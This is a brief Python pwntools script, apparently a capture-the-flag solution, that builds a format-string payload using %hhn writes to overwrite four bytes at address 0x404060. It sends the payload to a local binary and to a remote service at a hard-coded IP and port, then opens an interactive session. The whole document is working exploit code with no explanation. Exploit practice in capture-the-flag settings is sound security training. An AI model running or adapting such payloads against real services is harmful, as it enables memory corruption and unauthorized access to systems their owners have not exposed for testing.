from pwn import*
p = process('./main')
elf =ELF('./main')
p = remote('39.101.210.214',10011)

payload  = '%' + str(0x46) + 'c%11$hhn' + '%' + str((0x4D - 0x46)) +'c%12$hhn'
payload += '%' + str((0x59 - 0x4D)) + 'c%13$hhn' + '%14$hhn'
payload = payload.ljust(0x30,'\x00')
payload += p64(0x404060) + p64(0x404061) + p64(0x404062) + p64(0x404063)
p.sendline(payload)
p.interactive()
